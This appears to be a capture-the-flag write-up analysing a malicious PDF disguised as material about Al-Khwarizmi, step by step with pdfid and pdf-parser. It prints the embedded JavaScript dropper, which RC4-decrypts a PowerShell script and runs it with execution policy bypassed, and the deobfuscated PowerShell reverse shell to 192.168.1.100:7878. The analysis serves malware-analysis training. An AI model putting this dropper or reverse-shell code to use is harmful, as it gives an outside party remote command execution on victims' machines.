# JUST PDF 

A member of the CYBER ETO accounting team inadvertently executed a malicious payload after opening a PDF file, which was disguised as information about Al-Khwarizmi and received from a personal contact.


#### Step one : We Have A pdf we dont know if its mallicious or not so lets go to DIE ( Detect It Easy ) 

<img width="937" height="546" alt="image" src="https://github.com/user-attachments/assets/28a2d431-d1ba-40ac-a768-a090a42f55ee" />

it said that this just an PDF nothing mallicious 

#### Step two : Lets try pdfid.py that is in DidierStevensSuite-master and peepdf.py
<img width="958" height="417" alt="image" src="https://github.com/user-attachments/assets/9325ff8c-dbad-4c43-8fd6-076b72dbea21" />

as it appear we have a Multiply objects such as ( obj , stream .... ) but the interested one is /JS it tells that there is a one object inside it 
So let's go parse it 

#### Step three : We will parese it using pdf-parser.py to get where exactly the /JS object 
  We will use this command
```
 pdf-parser.py -s /JS Khwarizmi_BEA.pdf
```
-s /JS --> Search for the "/JS"

```
function rc4Buffer(key, data) {
    var s = [];
    for (var i = 0; i < 256; i++) s[i] = i;
    var j = 0;
    for (var i = 0; i < 256; i++) {
        j = (j + s[i] + key.charCodeAt(i % key.length)) & 0xff;
        var tmp = s[i]; s[i] = s[j]; s[j] = tmp;
    }

    var i = 0, j = 0;
    var result = [];
    for (var k = 0; k < data.length; k++) {
        i = (i + 1) & 0xff;
        j = (j + s[i]) & 0xff;
        var tmp2 = s[i]; s[i] = s[j]; s[j] = tmp2;
        var rnd = s[(s[i] + s[j]) & 0xff];
        result[k] = data[k] ^ rnd;
    }
    return result;
}

function bytesToString(bytes) {
    var str = "";
    for (var i = 0; i < bytes.length; i++) {
        str += String.fromCharCode(bytes[i]);
    }
    return str;
}

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

var key = "Hello World";
var decryptedArr = rc4Buffer(key, Payload_Data);
var plainText = bytesToString(decryptedArr);
var tempFile = fso.GetSpecialFolder(2) + "\\tempScript.ps1";
var file = fso.CreateTextFile(tempFile, true, true);
file.Write(plainText);
file.Close();
shell.Run('powershell -NoProfile -ExecutionPolicy Bypass -File "' + tempFile + '"', 1, true);
```
its appear as A RC4 payload decrytion that decrypt the payload and create a temp file then run that temp

Now save on ps1 file and then Deobfsucte it with PowerDecode ( https://github.com/Malandrone/PowerDecode ) 
#### Deobf using PowerDecode 

We got this script from PowerDecode 
```

$port = 7878
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = $encoding.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```
So now we got the Port AND ip addr 

CYBER-ETO{192.168.1.100_7878}
